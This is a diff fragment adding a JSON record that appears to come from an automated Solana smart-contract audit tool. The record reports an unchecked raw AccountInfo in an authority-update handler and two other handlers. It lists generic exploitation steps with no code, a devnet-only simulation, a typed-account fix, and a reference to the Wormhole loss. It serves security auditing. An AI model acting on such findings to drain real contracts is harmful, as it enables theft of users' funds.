+    "location": "handler_update_second_delegated_authority.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": "pub new_second_delegated_authority: AccountInfo<'info>",
+          "description": "Analyze vulnerable function: UpdateSecondDelegatedAuthority",
+          "step_number": 1
+        },
+        {
+          "action_type": "Transaction",
+          "code_snippet": null,
+          "description": "Construct malicious transaction",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Execute exploit and extract value",
+          "step_number": 3
+        }
+      ],
+      "difficulty": "Easy",
+      "economic_impact": "HIGH - Significant financial impact",
+      "expected_outcome": "Vulnerability exploited: Account `new_second_delegated_authority` in `UpdateSecondDelegatedAuthority` uses raw `AccountInfo` which provides no type safety or discriminator checking. The account data can contain anything — including data from a completely different program. [found in 3 locations; also in: handler_transfer_ownership.rs:TransferOwnership, handler_initialize_reward.rs:InitializeReward]",
+      "mitigations": [
+        "Always use typed accounts with discriminator validation."
+      ],
+      "prerequisites": [
+        "Access to handler_update_second_delegated_authority.rs"
+      ],
+      "rust_poc": null,
+      "scenario_name": "SOL-ALIAS-02: Raw AccountInfo Without Type Safety",
+      "typescript_poc": null,
+      "vulnerability_id": "SOL-ALIAS-02"
+    },
+    "prevention": "Always use typed accounts with discriminator validation.",
+    "real_world_incident": {
+      "date": "2022-02-02",
+      "loss": "$320M",
+      "project": "Wormhole Bridge"
+    },
+    "secure_fix": "Replace `AccountInfo` with a typed Anchor account: `Account<'info, YourType>` which automatically validates the discriminator and owner.",
+    "severity": 4,
+    "severity_label": "HIGH",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated AccountConfusion exploit for SOL-ALIAS-02 (Raw AccountInfo Without Type Safety). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Raw AccountInfo Without Type Safety",
+    "vulnerable_code": "pub new_second_delegated_authority: AccountInfo<'info>"
+  }
+]
